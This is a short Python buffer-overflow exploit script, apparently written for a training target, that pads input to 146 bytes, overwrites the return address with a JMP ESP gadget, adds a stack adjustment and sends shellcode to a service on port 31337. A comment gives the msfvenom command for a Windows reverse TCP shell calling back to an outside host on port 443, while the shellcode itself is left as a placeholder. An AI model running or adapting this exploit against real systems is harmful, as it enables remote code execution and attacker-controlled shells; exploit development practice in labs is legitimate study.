#!/usr/bin/python
import socket, time, struct

ip = "172.16.32.128"
port = 31337

eip_off = 146
buf_supp = 1024

#msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.91.129 LPORT=443 -b '\x00\x0a' -e x86/shikata_ga_nai -f python EXITFUNC=thread 
buf = shellcodehere

buff = ''
buff += "A" * (eip_off - len(buff))
buff += struct.pack("<I", 0x080414C3) #JMP ESP address
buff += "\x83\xec\x10" #GetPC bypass - move stack 16 
buff += buf
buff += "D" * (buf_supp - len(buff))


try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect((ip, port))
   time.sleep(1)
   s.send(buff + "\n");
   s.close()

except Exception as e:
   print(e)
